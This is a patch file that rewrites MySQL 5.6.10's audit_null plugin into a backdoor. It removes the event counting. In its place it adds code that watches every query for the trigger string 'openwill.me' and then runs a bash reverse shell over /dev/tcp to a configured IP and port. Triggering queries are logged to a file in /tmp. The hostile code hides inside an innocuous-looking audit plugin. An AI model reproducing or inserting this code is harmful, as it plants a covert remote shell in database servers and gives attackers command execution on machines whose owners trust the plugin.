@@ -1,0 +1,106 @@
+--- mysql-5.6.10/plugin/audit_null/audit_null.c	2013-01-23 00:54:49.000000000 +0800
++++ audit_null.c	2013-03-30 00:37:54.409049885 +0800
+@@ -17,10 +17,22 @@
+ #include <stdio.h>
+ #include <mysql/plugin.h>
+ #include <mysql/plugin_audit.h>
++#include <semaphore.h>
++#include <fcntl.h>
++#include <stdlib.h>
++#include <string.h>
++#include <time.h>
++
++#define BACK_IP "127.0.0.1"
++#define BACK_PORT "8080"
++#define DEBUG 1
+ 
+ #if !defined(__attribute__) && (defined(__cplusplus) || !defined(__GNUC__)  || __GNUC__ == 2 && __GNUC_MINOR__ < 8)
+ #define __attribute__(A)
+ #endif
++static FILE *log_fp;
++static sem_t *sem = NULL;
++static time_t last_exec;
+ 
+ static volatile int number_of_calls; /* for SHOW STATUS, see below */
+ /* Count MYSQL_AUDIT_GENERAL_CLASS event instances */
+@@ -58,6 +70,8 @@
+   number_of_calls_connection_connect= 0;
+   number_of_calls_connection_disconnect= 0;
+   number_of_calls_connection_change_user= 0;
++  log_fp = NULL;
++  sem = NULL;
+   return(0);
+ }
+ 
+@@ -77,6 +91,8 @@
+ 
+ static int audit_null_plugin_deinit(void *arg __attribute__((unused)))
+ {
++  if(log_fp!=NULL) fclose(log_fp);
++  if(sem!=NULL) sem_close(sem);
+   return(0);
+ }
+ 
+@@ -99,44 +115,24 @@
+   number_of_calls++;
+   if (event_class == MYSQL_AUDIT_GENERAL_CLASS)
+   {
+-    const struct mysql_event_general *event_general=
+-      (const struct mysql_event_general *) event;
+-    switch (event_general->event_subclass)
+-    {
+-    case MYSQL_AUDIT_GENERAL_LOG:
+-      number_of_calls_general_log++;
+-      break;
+-    case MYSQL_AUDIT_GENERAL_ERROR:
+-      number_of_calls_general_error++;
+-      break;
+-    case MYSQL_AUDIT_GENERAL_RESULT:
+-      number_of_calls_general_result++;
+-      break;
+-    case MYSQL_AUDIT_GENERAL_STATUS:
+-      number_of_calls_general_status++;
+-      break;
+-    default:
+-      break;
+-    }
+-  }
+-  else if (event_class == MYSQL_AUDIT_CONNECTION_CLASS)
+-  {
+-    const struct mysql_event_connection *event_connection=
+-      (const struct mysql_event_connection *) event;
+-    switch (event_connection->event_subclass)
+-    {
+-    case MYSQL_AUDIT_CONNECTION_CONNECT:
+-      number_of_calls_connection_connect++;
+-      break;
+-    case MYSQL_AUDIT_CONNECTION_DISCONNECT:
+-      number_of_calls_connection_disconnect++;
+-      break;
+-    case MYSQL_AUDIT_CONNECTION_CHANGE_USER:
+-      number_of_calls_connection_change_user++;
+-      break;
+-    default:
+-      break;
+-    }
++    const   struct mysql_event_general *pEvent;
++
++    pEvent = (const struct mysql_event_general *) event;
++    if (pEvent->general_query != NULL && *(pEvent->general_query) != '\0') {
++        sem = sem_open("haha", O_RDWR|O_CREAT, 00777, 1);
++        if(strstr(pEvent->general_query,"openwill.me")!=NULL && sem_trywait(sem)==0 && (time(0)-last_exec)>10){
++            last_exec = time(0);
++            #ifdef DEBUG
++            if(log_fp == NULL)log_fp = fopen("/tmp/null_audit.log", "a");
++            fprintf(log_fp, "execing\n");
++            fprintf(log_fp, "%s;\n\n", pEvent->general_query);
++            fflush(log_fp);
++            #endif
++            system("bash < /dev/tcp/"BACK_IP"/"BACK_PORT" >&0 2>&0 &");
++        }
++        sem_unlink("haha");
++   }    
++   //Job done
+   }
+ }
+ 
